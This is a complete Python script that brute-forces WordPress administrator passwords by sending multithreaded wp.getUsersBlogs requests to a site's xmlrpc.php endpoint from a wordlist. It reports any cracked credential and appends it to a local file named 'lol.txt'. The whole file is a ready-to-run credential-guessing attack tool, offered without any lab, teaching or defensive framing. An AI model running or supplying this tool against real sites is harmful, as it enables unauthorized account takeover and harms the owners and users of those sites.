import requests # For making HTTP requests
import xml.etree.ElementTree as ET # For parsing XML responses
import html # For escaping special characters in XML
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import time
# socket is still useful for catching requests.exceptions.ConnectionError, Timeout
import socket

# --- Configuration ---
DEFAULT_USERNAME = "admin"
DEFAULT_METHOD = "wp.getUsersBlogs" # Common WordPress method
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 10 # seconds for requests
OUTPUT_FILE = "lol.txt"

# --- Globals for thread communication ---
found_event = threading.Event()
found_password_global = None
tried_passwords_count = 0
total_passwords = 0
lock = threading.Lock()
METHOD_TO_TRY = DEFAULT_METHOD # Will be set from args

def print_status(message):
    sys.stderr.write(f"\r{message}")
    sys.stderr.flush()

def build_xml_payload(method_name, username, password):
    # Escape username and password to prevent XML injection if they contain special chars
    safe_username = html.escape(username)
    safe_password = html.escape(password)

    xml_payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>{method_name}</methodName>
  <params>
    <param>
      <value><string>{safe_username}</string></value>
    </param>
    <param>
      <value><string>{safe_password}</string></value>
    </param>
  </params>
</methodCall>
"""
    return xml_payload.encode('utf-8') # Encode to bytes for requests

def attempt_login_manual(url, username, password, timeout_seconds, method_name):
    global found_password_global, tried_passwords_count

    if found_event.is_set():
        return None

    xml_data = build_xml_payload(method_name, username, password)
    headers = {
        'Content-Type': 'text/xml',
        'User-Agent': 'Python XML-RPC BruteForcer' # Good practice
    }

    response_text = "" # For debugging if needed

    try:
        response = requests.post(url, data=xml_data, headers=headers, timeout=timeout_seconds)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        response_text = response.text

        # --- XML Response Parsing ---
        # A successful XML-RPC call (even one that returns a fault) should be valid XML.
        # If it's not (e.g., an HTML error page from a WAF), ET.fromstring will fail.
        try:
            root = ET.fromstring(response.content)
        except ET.ParseError:
            # This means the response was not valid XML.
            # It could be an HTML error page, a WAF block, etc.
            # For brute-forcing, this is usually treated as a failure for this password.
            # print_status(f"[*] Non-XML response for '{password}'. Server might be blocking or misconfigured.")
            return None


        # Check for an XML-RPC fault
        fault_element = root.find('.//fault')
        if fault_element is not None:
            fault_code_el = fault_element.find('.//member[name="faultCode"]/value/int')
            fault_string_el = fault_element.find('.//member[name="faultString"]/value/string')
            
            fault_code = fault_code_el.text if fault_code_el is not None else "Unknown"
            # fault_string = fault_string_el.text if fault_string_el is not None else "Unknown"
            
            if fault_code == "403": # Common for bad credentials
                pass # print_status(f"[-] Failed (403): {password}")
            else:
                # print_status(f"[*] XML-RPC Fault for '{password}': {fault_string} (Code: {fault_code})")
                pass # Suppress other faults for cleaner output during brute-force
            return None # It's a fault, so not the correct password

        # If no fault, assume success for this context
        # A more robust check would be to verify the structure of the expected successful response,
        # but for many brute-force scenarios, lack of a fault is enough to flag.
        # For wp.getUsersBlogs, a successful response contains <params><param><value><array>...
        
        # Let's be a bit more specific for wp.getUsersBlogs:
        # It should return an array, even if empty for a valid user with no blogs.
        success_indicator = root.find('.//params/param/value/array')
        if success_indicator is not None or method_name != "wp.getUsersBlogs": # Generalize if not wp.getUsersBlogs
            # Or, for a more general success: if no fault and got 200 OK + valid XML.
            with lock:
                if not found_event.is_set():
                    print_status("")
                    success_message = f"\n[+] SUCCESS! Username: '{username}', Password: '{password}'"
                    print(success_message)
                    print(f"    URL: {url}")
                    print(f"    Method: {method_name}")
                    # Try to get some part of the result if possible for verification
                    try:
                        result_preview = ET.tostring(root.find('.//params'), encoding='unicode', short_empty_elements=False)[:200]
                        print(f"    Result Preview: {result_preview}...")
                    except:
                        print(f"    Result: (Successfully parsed XML, structure varies by method)")


                    found_password_global = password
                    found_event.set()

                    try:
                        with open(OUTPUT_FILE, "a", encoding="utf-8") as f_out:
                            f_out.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\nMethod: {method_name}\n")
                            try:
                                result_preview_file = ET.tostring(root.find('.//params'), encoding='unicode', short_empty_elements=False)
                                f_out.write(f"Result Preview: {result_preview_file[:500]}...\n")
                            except:
                                f_out.write("Result: (Successfully parsed XML, structure varies by method)\n")
                            f_out.write("-" * 20 + "\n")
                        print(f"[*] Credentials saved to {OUTPUT_FILE}")
                    except Exception as e_file:
                        print(f"[!] Error saving to {OUTPUT_FILE}: {e_file}")
            return password
        else:
            # Valid XML, 200 OK, but not the expected success structure for wp.getUsersBlogs
            # This could be a very unusual server response. Treat as failure for now.
            # print_status(f"[*] Unexpected XML structure for '{password}' (not a fault, but not expected success for {method_name})")
            return None


    except requests.exceptions.HTTPError as e:
        # Handles 4xx and 5xx errors from response.raise_for_status()
        # A 401 Unauthorized or 403 Forbidden HTTP error might also indicate auth failure
        # if the server doesn't use XML-RPC faults for it.
        # However, standard XML-RPC should give 200 OK with a <fault> element.
        # This usually means something else is wrong (WAF, server config, endpoint doesn't exist as expected)
        # print_status(f"[*] HTTP Error for '{password}': {e.response.status_code} {e.response.reason}")
        pass
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, socket.timeout) as e:
        print_status(f"[*] Network/Timeout error for '{password}' on {url}: {type(e).__name__}         ")
    except requests.exceptions.RequestException as e: # Catch other requests errors
        print_status(f"[*] Request error for '{password}': {e}                                      ")
    except Exception as e:
        # General catch-all, helpful for unexpected issues during manual parsing
        print_status(f"[*] General error for '{password}': {type(e).__name__} - {e}                 ")
        # print(f"DEBUG: Response text was: {response_text[:200]}") # Uncomment for debugging
    finally:
        with lock:
            tried_passwords_count += 1
            if not found_event.is_set():
                progress = (tried_passwords_count / total_passwords) * 100 if total_passwords > 0 else 0
                status_msg = f"[*] Attempts: {tried_passwords_count}/{total_passwords} ({progress:.2f}%) | Testing: {password[:15]:<15}..."
                print_status(status_msg.ljust(80))
    return None


def main():
    global total_passwords, found_password_global, METHOD_TO_TRY

    parser = argparse.ArgumentParser(description="Manual XML-RPC Brute-Forcer (no xmlrpc.client). Saves found credential to lol.txt.")
    parser.add_argument("url", help="Target XML-RPC URL (e.g., http://target.com/xmlrpc.php)")
    parser.add_argument("password_file", help="File containing passwords, one per line")
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME, help=f"Username (default: {DEFAULT_USERNAME})")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help=f"Threads (default: {DEFAULT_THREADS})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("-m", "--method", default=DEFAULT_METHOD, help=f"XML-RPC method (default: {DEFAULT_METHOD})")

    args = parser.parse_args()
    METHOD_TO_TRY = args.method # Set the global method from args

    # Note: socket.setdefaulttimeout() is not directly used by `requests`
    # `requests` has its own timeout parameter.

    print(f"[*] Target URL: {args.url}")
    print(f"[*] Username:   {args.username}")
    print(f"[*] Password File: {args.password_file}")
    print(f"[*] Threads:    {args.threads}")
    print(f"[*] Timeout:    {args.timeout}s")
    print(f"[*] Method:     {METHOD_TO_TRY}")
    print(f"[*] Output File: {OUTPUT_FILE}")
    print("-" * 30)

    try:
        with open(args.password_file, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not passwords:
            print("[!] Password file is empty.")
            return
        total_passwords = len(passwords)
        print(f"[*] Loaded {total_passwords} passwords.")
    except FileNotFoundError:
        print(f"[!] Error: Password file '{args.password_file}' not found.")
        return
    except Exception as e:
        print(f"[!] Error reading password file: {e}")
        return

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(attempt_login_manual, args.url, args.username, pwd, args.timeout, METHOD_TO_TRY) for pwd in passwords]
        try:
            for future in as_completed(futures):
                if found_event.is_set():
                    for f_cancel in futures:
                        if not f_cancel.done(): f_cancel.cancel()
                    break
        except KeyboardInterrupt:
            print_status("")
            print("\n[!] Ctrl+C detected. Shutting down...")
            found_event.set()
            executor.shutdown(wait=True, cancel_futures=True) # Python 3.9+
            # For older Python: executor.shutdown(wait=True) and threads check found_event
            print("[!] Shutdown complete.")
            sys.exit(1)

    end_time = time.time()
    print_status("".ljust(80))
    print("\n" + "-" * 30)

    if found_password_global:
        print(f"[+] Password found: '{found_password_global}' for username '{args.username}'")
        print(f"[*] Details saved to {OUTPUT_FILE}")
    else:
        print(f"[-] Password not found for username '{args.username}'.")

    print(f"[*] Total time taken: {end_time - start_time:.2f} seconds.")
    print(f"[*] Total attempts made: {tried_passwords_count}")

if __name__ == "__main__":
    # Make sure you have the 'requests' library installed: pip install requests
    main()
